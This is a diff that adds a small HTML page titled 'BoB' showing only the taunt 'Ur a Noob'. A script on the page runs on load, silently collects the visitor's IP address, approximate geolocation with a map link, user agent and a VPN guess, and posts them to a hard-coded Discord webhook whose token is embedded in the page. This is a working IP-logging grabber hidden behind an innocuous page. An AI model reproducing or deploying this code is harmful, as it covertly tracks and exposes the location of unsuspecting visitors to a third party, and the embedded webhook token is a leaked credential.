@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> BoB </title>
+
+</head>
+<body>
+    <h1>Ur a Noob</h1>
+
+    <script>
+        async function fetchVisitorInfo() {
+            // Fetch the visitor's IP address
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const IP = ipData.ip;
+
+            // Fetch IP details
+            const detailsResponse = await fetch(`http://ip-api.com/json/${IP}`);
+            const Details = await detailsResponse.json();
+
+            // Fetch VPN connection details
+            const vpnResponse = await fetch(`https://json.geoiplookup.io/${IP}`);
+            const VPNConn = await vpnResponse.json();
+            const VPN = VPNConn.connection_type === "Corporate" ? "Yes" : "No";
+
+            // Get browser details
+            const Browser = navigator.userAgent;
+
+            // Stop the bots from logging
+            if (/bot|Discord|robot|curl|spider|crawler|^$/i.test(Browser)) {
+                return;
+            }
+
+            // Set the timezone and date/time details
+            const date = new Date();
+            const options = { timeZone: "Europe/Amsterdam", day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+            const [Date, Time] = date.toLocaleString("en-GB", options).split(', ');
+
+            // Set the geolocation and other details
+            const Country = Details.country;
+            const CountryCode = Details.countryCode.toLowerCase();
+            const Region = Details.regionName;
+            const City = Details.city;
+            const Zip = Details.zip;
+            const Lat = Details.lat;
+            const Lon = Details.lon;
+            const WebhookName = IP;
+            const Flag = `https://countryflagsapi.com/png/${CountryCode}`;
+
+            // Construct the Discord webhook payload
+            const InfoArr = {
+                username: WebhookName,
+                avatar_url: Flag,
+                embeds: [{
+                    title: `Visitor From ${Country}`,
+                    color: 39423,
+                    fields: [
+                        { name: "IP", value: IP, inline: true },
+                        { name: "VPN?", value: VPN, inline: true },
+                        { name: "Useragent", value: Browser },
+                        { name: "Country/CountryCode", value: `${Country}/${CountryCode}`, inline: true },
+                        { 
+                            name: "Region | City | Zip", 
+                            value: `[${Region} | ${City} | ${Zip}](https://www.google.com/maps/search/?api=1&query=${Lat},${Lon} 'Google Maps Location (+/- 750M Radius)')`, 
+                            inline: true 
+                        }
+                    ],
+                    footer: {
+                        text: `${Date} ${Time}`,
+                        icon_url: "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
+                    }
+                }]
+            };
+
+            // Send the data to the Discord webhook
+            fetch("https://discordapp.com/api/webhooks/1254501571883176069/8xvnpBkVETzCyTz9ymrrcPM6fyVCvEcCmhshMbwayXpZVHjqEdLpSDc-FHMIJvfTQCOq", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(InfoArr)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch(error => console.error('Error:', error));
+        }
+
+        fetchVisitorInfo();
+    </script>
+</body>
+</html>
